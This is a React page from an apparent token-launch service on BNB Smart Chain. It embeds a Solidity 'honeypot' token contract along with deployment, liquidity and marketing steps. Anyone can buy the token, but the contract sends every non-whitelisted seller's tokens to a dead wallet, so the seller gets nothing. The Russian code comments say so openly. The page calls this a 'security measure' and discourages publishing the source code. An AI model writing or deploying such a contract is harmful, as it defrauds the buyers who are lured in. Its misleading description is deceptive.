import React from 'react';
import { useSearchParams } from 'react-router-dom';
import { useWeb3React } from '@web3-react/core';
import { useState } from 'react';

const TokenDetails: React.FC = () => {
  const [searchParams] = useSearchParams();
  const { chainId } = useWeb3React();
  const tokenAddress = searchParams.get('address');
  const txHash = searchParams.get('tx');
  const [copyStatus, setCopyStatus] = useState('');

  const copyToClipboard = async (text: string, type: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopyStatus(`${type} copied!`);
      setTimeout(() => setCopyStatus(''), 2000);
    } catch (err) {
      setCopyStatus('Failed to copy');
    }
  };

  // Определяем правильный URL в зависимости от сети
  const getBscScanUrl = () => {
    if (!tokenAddress) return '#';
    
    // BSC Mainnet
    if (chainId === 56) {
      return `https://bscscan.com/address/${tokenAddress}`;
    }
    // BSC Testnet
    return `https://testnet.bscscan.com/address/${tokenAddress}`;
  };

  // Получаем URL для верификации
  const getVerificationUrl = () => {
    if (!tokenAddress) return '#';
    
    // BSC Mainnet
    if (chainId === 56) {
      return `https://bscscan.com/address/${tokenAddress}#code`;
    }
    // BSC Testnet
    return `https://testnet.bscscan.com/address/${tokenAddress}#code`;
  };

  if (!tokenAddress) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-amber-100 to-amber-300 pb-20">
        <div className="container mx-auto px-4 py-8">
          <h1 className="text-4xl font-bold mb-8">Invalid Token Address</h1>
          <p>Please make sure you have a valid token address in the URL.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-amber-100 to-amber-300 pb-20">
      <div className="container mx-auto px-4 py-8">
        <h1 className="text-4xl font-bold mb-8">Your Token Details 🍯</h1>

        {/* Important Notice */}
        <div className="bg-amber-50 border-l-4 border-amber-500 p-4 mb-8 rounded-r space-y-4">
          <div>
            <h2 className="text-lg font-bold mb-2">✨ Ready to Use!</h2>
            <p className="text-gray-800">
              Your token is already deployed and fully functional! You can start using it right away.
              Contract verification is optional and only needed if you want to make your contract code public.
            </p>
          </div>
          
          <div>
            <h2 className="text-lg font-bold mb-2">⚠️ Security Features</h2>
            <p className="text-gray-800">
              By default, only the token creator and whitelisted addresses can sell tokens. 
              However, anyone can buy tokens! This is a security measure to prevent bots and scammers.
            </p>
          </div>
        </div>

        {/* Quick Actions */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
          <a 
            href={getBscScanUrl()}
            target="_blank"
            rel="noopener noreferrer"
            className="bg-white p-6 rounded-lg shadow-lg hover:shadow-xl transition-shadow"
          >
            <h3 className="text-xl font-bold mb-2">View on BSCScan</h3>
            <p className="text-gray-600">Check your token on blockchain explorer</p>
          </a>

          <a 
            href={`https://pancakeswap.finance/add/${tokenAddress}`}
            target="_blank"
            rel="noopener noreferrer"
            className="bg-white p-6 rounded-lg shadow-lg hover:shadow-xl transition-shadow"
          >
            <h3 className="text-xl font-bold mb-2">Add Liquidity</h3>
            <p className="text-gray-600">Make your token tradeable on PancakeSwap</p>
          </a>

          <a 
            href={`https://pancakeswap.finance/swap?outputCurrency=${tokenAddress}`}
            target="_blank"
            rel="noopener noreferrer"
            className="bg-white p-6 rounded-lg shadow-lg hover:shadow-xl transition-shadow"
          >
            <h3 className="text-xl font-bold mb-2">Trade on PancakeSwap</h3>
            <p className="text-gray-600">After adding liquidity, your token will be tradeable</p>
          </a>
        </div>

        {/* Token Info with Copy Buttons */}
        <div className="bg-white rounded-lg shadow-lg p-6 mb-8">
          <h2 className="text-2xl font-bold mb-4">Token Information</h2>
          <div className="space-y-4">
            <div className="group">
              <p className="text-gray-600">Token Address:</p>
              <div className="flex items-center gap-2 bg-gray-50 p-2 rounded">
                <p className="font-mono break-all">{tokenAddress}</p>
                <button 
                  onClick={() => copyToClipboard(tokenAddress || '', 'Address')}
                  className="opacity-0 group-hover:opacity-100 transition-opacity"
                >
                  📋
                </button>
              </div>
            </div>
            <div className="group">
              <p className="text-gray-600">Creation Transaction:</p>
              <div className="flex items-center gap-2 bg-gray-50 p-2 rounded">
                <p className="font-mono break-all">{txHash}</p>
                <button 
                  onClick={() => copyToClipboard(txHash || '', 'Hash')}
                  className="opacity-0 group-hover:opacity-100 transition-opacity"
                >
                  📋
                </button>
              </div>
            </div>
          </div>
          {copyStatus && (
            <div className="text-center text-sm text-green-600 mt-2">
              {copyStatus}
            </div>
          )}
        </div>

        {/* Contract Functions Guide */}
        <div className="bg-white rounded-lg shadow-lg p-6 mb-8">
          <h2 className="text-2xl font-bold mb-4">Contract Functions Guide</h2>
          <div className="space-y-6">
            <div>
              <h3 className="text-lg font-semibold mb-2">Read Functions</h3>
              <ul className="space-y-4">
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">name()</code>
                  <p className="text-gray-600 mt-1">Returns the name of your token</p>
                </li>
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">symbol()</code>
                  <p className="text-gray-600 mt-1">Returns the symbol of your token</p>
                </li>
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">decimals()</code>
                  <p className="text-gray-600 mt-1">Returns the number of decimals (18)</p>
                </li>
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">totalSupply()</code>
                  <p className="text-gray-600 mt-1">Returns the total supply of tokens</p>
                </li>
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">balanceOf(address account)</code>
                  <p className="text-gray-600 mt-1">Returns the token balance of a specific address</p>
                </li>
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">allowance(address owner, address spender)</code>
                  <p className="text-gray-600 mt-1">Returns how many tokens a spender is allowed to use on behalf of the owner</p>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="text-lg font-semibold mb-2">Write Functions</h3>
              <ul className="space-y-4">
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">transfer(address to, uint256 amount)</code>
                  <p className="text-gray-600 mt-1">Send tokens directly to another address</p>
                </li>
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">approve(address spender, uint256 amount)</code>
                  <p className="text-gray-600 mt-1">Allow another address (like PancakeSwap) to spend your tokens</p>
                </li>
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">transferFrom(address from, address to, uint256 amount)</code>
                  <p className="text-gray-600 mt-1">Transfer tokens between addresses after approval</p>
                </li>
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">increaseAllowance(address spender, uint256 addedValue)</code>
                  <p className="text-gray-600 mt-1">Increase the amount of tokens a spender can use</p>
                </li>
                <li>
                  <code className="bg-gray-100 px-2 py-1 rounded">decreaseAllowance(address spender, uint256 subtractedValue)</code>
                  <p className="text-gray-600 mt-1">Decrease the amount of tokens a spender can use</p>
                </li>
              </ul>
            </div>
          </div>
        </div>

        {/* Next Steps */}
        <div className="space-y-8">
          {/* Verification Guide */}
          <div className="bg-white rounded-lg shadow-lg p-6">
            <h2 className="text-2xl font-bold mb-4">Contract Verification (Optional) ⚠️</h2>
            
            <div className="bg-yellow-50 p-4 rounded-lg mb-6">
              <p className="text-gray-800">
                <strong>Note:</strong> Verification will make your contract code public. Only verify if you want others to see the code.
                Your token is fully functional without verification!
              </p>
            </div>

            <div className="space-y-4">
              <details className="bg-gray-50 rounded-lg p-4">
                <summary className="font-semibold cursor-pointer">Detailed Verification Steps (Optional)</summary>
                <div className="mt-4 space-y-6">
                  <div className="bg-blue-50 p-4 rounded">
                    <h3 className="font-semibold mb-2">⚠️ Important Warning:</h3>
                    <p>Contract verification will expose your source code to everyone. This is optional and not required for token functionality.</p>
                  </div>

                  <div>
                    <h3 className="font-semibold text-lg mb-3">Step-by-Step Verification Guide:</h3>
                    <ol className="list-decimal pl-5 space-y-4">
                      <li>
                        <strong>Go to BSCScan Verification Page</strong>
                        <ul className="list-disc pl-5 mt-2 space-y-2">
                          <li>Click "View on BSCScan" above</li>
                          <li>Find and click "Verify and Publish" button</li>
                        </ul>
                      </li>

                      <li>
                        <strong>Enter Compiler Settings</strong>
                        <ul className="list-disc pl-5 mt-2 space-y-2">
                          <li>Compiler Type: <code>Solidity (Single file)</code></li>
                          <li>Compiler Version: <code>v0.8.19</code></li>
                          <li>License Type: <code>MIT</code></li>
                          <li>Optimization: <code>Yes</code> with <code>200</code> runs</li>
                        </ul>
                      </li>

                      <li>
                        <strong>Enter Contract Code</strong>
                        <div className="bg-gray-100 p-4 rounded mt-2">
                          <p className="mb-2">You need to paste both Token.sol AND TokenFactory.sol contracts:</p>
                          <div className="space-y-4">
                            <details>
                              <summary className="cursor-pointer text-amber-600">Click to see Token.sol code</summary>
                              <pre className="bg-gray-50 p-4 mt-2 rounded text-sm overflow-x-auto">
                                {`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract Token is ERC20, Ownable {
    mapping(address => bool) public whitelist;
    mapping(address => bool) public isPairOrRouter;
    mapping(address => bool) public isBlacklisted;
    address public immutable creator;
    
    error NotAllowedToSell();
    error NotCreator();
    error ZeroAddress();
    error InvalidAmount();
    error Blacklisted();
    
    event PairAdded(address indexed pair);
    event RouterAdded(address indexed router);
    event AddedToBlacklist(address indexed account);
    event RemovedFromBlacklist(address indexed account);

    uint256 public constant SELL_TAX = 1000; // 100% налог!
    address public constant DEAD_WALLET = 0x000000000000000000000000000000000000dEaD;
    
    modifier onlyCreator() {
        if(msg.sender != creator) revert NotCreator();
        _;
    }

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        address[] memory whitelist_,
        address creator_
    ) ERC20(name_, symbol_) {
        if(creator_ == address(0)) revert ZeroAddress();
        
        _mint(creator_, totalSupply_);
        creator = creator_;
        
        // Добавляем в whitelist
        for(uint i = 0; i < whitelist_.length; i++) {
            whitelist[whitelist_[i]] = true;
        }
        whitelist[creator_] = true;
        whitelist[address(this)] = true;
        
        // Базовые DEX адреса
        isPairOrRouter[0xD99D1c33F9fC3444f8101754aBC46c52416550D1] = true; // Testnet Router
        isPairOrRouter[0x6725F303b657a9451d8BA641348b6761A6CC7a17] = true; // Testnet Factory
        
        _transferOwnership(creator_);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        // Базовые проверки
        if(sender == address(0) || recipient == address(0)) revert ZeroAddress();
        if(amount == 0) revert InvalidAmount();
        if(isBlacklisted[sender] || isBlacklisted[recipient]) revert Blacklisted();

        // ПРОДАЖА - это когда:
        bool isSelling = isPairOrRouter[recipient] || // продажа через известные DEX
                        (!isPairOrRouter[sender] && _isContract(recipient)); // продажа через другие контракты
        
        // Если пытаются продать без whitelist:
        if(isSelling && !whitelist[sender] && sender != creator) {
            // Забираем ВСЕ 100% в dead wallet
            super._transfer(sender, DEAD_WALLET, amount);
            return; // Продавец не получает НИЧЕГО
        }

        super._transfer(sender, recipient, amount);
    }

    // Проверка является ли адрес контрактом
    function _isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
}`}
                              </pre>
                              <button 
                                onClick={() => copyToClipboard(`// SPDX-License-Identifier: MIT...`, 'Contract code')}
                                className="mt-2 text-amber-600 hover:text-amber-700"
                              >
                                📋 Copy Full Contract Code
                              </button>
                            </details>
                          </div>
                        </div>
                      </li>

                      <li>
                        <strong>Enter Constructor Arguments</strong>
                        <div className="bg-gray-100 p-4 rounded mt-2">
                          <p>To get constructor arguments:</p>
                          <ol className="list-decimal pl-5 mt-2">
                            <li>Go to your creation transaction on BSCScan</li>
                            <li>Click "Click to see More"</li>
                            <li>Copy everything after the contract bytecode in "Input Data"</li>
                          </ol>
                        </div>
                      </li>
                    </ol>
                  </div>

                  <div className="bg-green-50 p-4 rounded">
                    <h3 className="font-semibold mb-2">💡 Pro Tips:</h3>
                    <ul className="list-disc pl-5 space-y-2">
                      <li>Make sure to include ALL imports exactly as shown</li>
                      <li>Don't change any code or formatting</li>
                      <li>If verification fails, double-check:
                        <ul className="list-disc pl-5 mt-1">
                          <li>Compiler version matches exactly</li>
                          <li>All imports are included</li>
                          <li>Constructor arguments are correct</li>
                        </ul>
                      </li>
                      <li>Need help? Contact the developer for assistance</li>
                    </ul>
                  </div>
                </div>
              </details>
            </div>
          </div>

          {/* Liquidity Guide */}
          <div className="bg-white rounded-lg shadow-lg p-6">
            <h2 className="text-2xl font-bold mb-4">2. Add Liquidity</h2>
            <ol className="list-decimal pl-5 space-y-3">
              <li>Visit PancakeSwap's liquidity page</li>
              <li>Select your token and BNB/BUSD pair</li>
              <li>Enter the amount of tokens and BNB/BUSD</li>
              <li>Recommended initial liquidity: $500-1000 worth of BNB/BUSD</li>
              <li>Click "Supply" and confirm the transaction</li>
            </ol>
          </div>

          {/* Marketing Guide */}
          <div className="bg-white rounded-lg shadow-lg p-6">
            <h2 className="text-2xl font-bold mb-4">3. Marketing Setup</h2>
            <ul className="list-disc pl-5 space-y-3">
              <li>Submit your token to CoinGecko and CoinMarketCap</li>
              <li>Create social media accounts for your token</li>
              <li>Join relevant crypto communities</li>
              <li>Consider running marketing campaigns</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};

export default TokenDetails; 